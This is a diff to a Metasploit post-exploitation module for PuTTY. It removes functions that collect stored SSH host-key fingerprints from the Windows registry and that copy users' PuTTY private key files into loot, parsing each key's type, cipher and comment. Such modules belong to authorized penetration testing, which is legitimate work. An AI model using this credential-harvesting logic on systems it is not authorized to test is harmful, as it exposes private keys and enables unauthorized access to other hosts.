@@ -78,44 +78,6 @@ class MetasploitModule < Msf::Post
     # print_good("PuTTY saved sessions list saved to #{stored_path} in CSV format & available in notes (use 'notes -t putty.savedsession' to view).")
   end
 
-  def get_stored_host_key_details(allkeys)
-    # This hash will store (as the key) host:port pairs. This is basically a quick way of
-    # getting a unique list of host:port pairs.
-    all_ssh_host_keys = {}
-
-    # This regex will split up lines such as rsa2@22:127.0.0.1 from the registry.
-    rx_split_hostporttype = /^(?<type>[-a-z0-9]+?)@(?<port>[0-9]+?):(?<host>.+)$/i
-
-    # Go through each of the stored keys found in the registry
-    allkeys.each do |key|
-      # Store the raw key and value in a hash to start off with
-      newkey = {
-        rawname: key,
-        rawsig: registry_getvaldata("#{PAGEANT_REGISTRY_KEY}\\SshHostKeys", key).to_s
-      }
-
-      # Take the key and split up host, port and fingerprint type. If it matches, store the information
-      # in the hash for later.
-      split_hostporttype = rx_split_hostporttype.match(key.to_s)
-      if split_hostporttype
-
-        # Extract the host, port and key type into the hash
-        newkey['host'] = split_hostporttype[:host]
-        newkey['port'] = split_hostporttype[:port]
-        newkey['type'] = split_hostporttype[:type]
-
-        # Form the key
-        host_port = "#{newkey['host']}:#{newkey['port']}"
-
-        # Add it to the consolidation hash. If the same IP has different key types, append to the array
-        all_ssh_host_keys[host_port] = [] if all_ssh_host_keys[host_port].nil?
-        all_ssh_host_keys[host_port] << newkey['type']
-      end
-      report_note(host: target_host, type: "putty.storedfingerprint", data: newkey, update: :unique_data)
-    end
-    all_ssh_host_keys
-  end
-
   def display_stored_host_keys_report(info)
     # Results table holds raw string data
     results_table = Rex::Text::Table.new(
@@ -136,65 +98,6 @@ class MetasploitModule < Msf::Post
     print_line results_table.to_s
     stored_path = store_loot('putty.storedfingerprints.csv', 'text/csv', session, results_table.to_csv, nil, "PuTTY Stored SSH Host Keys List")
     print_good("PuTTY stored host keys list saved to #{stored_path} in CSV format & available in notes (use 'notes -t putty.storedfingerprint' to view).")
-  end
-
-  def grab_private_keys(sessions)
-    private_key_summary = []
-    sessions.each do |ses|
-      filename = ses['PublicKeyFile'].to_s
-      next if filename.empty?
-
-      # Check whether the file exists.
-      if file?(filename)
-        ppk = read_file(filename)
-        if ppk # Attempt to read the contents of the file
-          stored_path = store_loot('putty.ppk.file', 'application/octet-stream', session, ppk)
-          print_good("PuTTY private key file for \'#{ses['Name']}\' (#{filename}) saved to: #{stored_path}")
-
-          # Now analyse the private key
-          private_key = {}
-          private_key['Name'] = ses['Name']
-          private_key['UserName'] = ses['UserName']
-          private_key['HostName'] = ses['HostName']
-          private_key['PublicKeyFile'] = ses['PublicKeyFile']
-          private_key['Type'] = ''
-          private_key['Cipher'] = ''
-          private_key['Comment'] = ''
-
-          # Get type of key
-          if ppk.to_s =~ /^SSH PRIVATE KEY FILE FORMAT 1.1/
-            # This is an SSH1 header
-            private_key['Type'] = 'ssh1'
-            private_key['Comment'] = '-'
-            if ppk[33] == "\x00"
-              private_key['Cipher'] = 'none'
-            elsif ppk[33] == "\x03"
-              private_key['Cipher'] = '3DES'
-            else
-              private_key['Cipher'] = '(Unrecognised)'
-            end
-          elsif rx = /^PuTTY-User-Key-File-2:\sssh-(?<keytype>rsa|dss)[\r\n]/.match(ppk.to_s)
-            # This is an SSH2 header
-            private_key['Type'] = "ssh2 (#{rx[:keytype]})"
-            if rx = /^Encryption:\s(?<cipher>[-a-z0-9]+?)[\r\n]/.match(ppk.to_s)
-              private_key['Cipher'] = rx[:cipher]
-            else
-              private_key['Cipher'] = '(Unrecognised)'
-            end
-
-            if rx = /^Comment:\s(?<comment>.+?)[\r\n]/.match(ppk.to_s)
-              private_key['Comment'] = rx[:comment]
-            end
-          end
-          private_key_summary << private_key
-        else
-          print_error("Unable to read PuTTY private key file for \'#{ses['Name']}\' (#{filename})") # May be that we do not have permissions etc
-        end
-      else
-        print_error("PuTTY private key file for \'#{ses['Name']}\' (#{filename}) could not be read.")
-      end
-    end
-    private_key_summary
   end
 
   def get_syncengine_data(master,syncengines)
